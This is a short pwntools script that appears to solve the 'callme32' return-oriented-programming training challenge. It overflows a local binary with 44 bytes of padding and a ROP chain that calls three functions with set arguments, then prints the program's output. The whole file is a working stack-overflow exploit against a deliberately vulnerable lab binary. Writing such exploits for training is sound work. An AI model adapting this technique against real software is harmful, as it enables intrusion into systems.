from pwn import *

elf = context.binary = ELF('callme32')

callme_one = p32(elf.symbols.callme_one)
callme_two = p32(elf.symbols.callme_two)
callme_three = p32(elf.symbols.callme_three)
pop = p32(0x080487f9)
args = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# payload = b'A' * 44 + callme_one + pop + args + callme_two + pop + args + callme_three + pop + args

ropdata = ROP(elf)
ropdata.callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)
ropdata.callme_two(0xdeadbeef, 0xcafebabe, 0xd00df00d)
ropdata.callme_three(0xdeadbeef, 0xcafebabe, 0xd00df00d)
info(ropdata.dump())
chain = ropdata.chain()

payload = b'A' * 44 + chain
p = process(elf.path)
p.sendlineafter('> ', payload)
print(p.recvall(timeout=0.5))
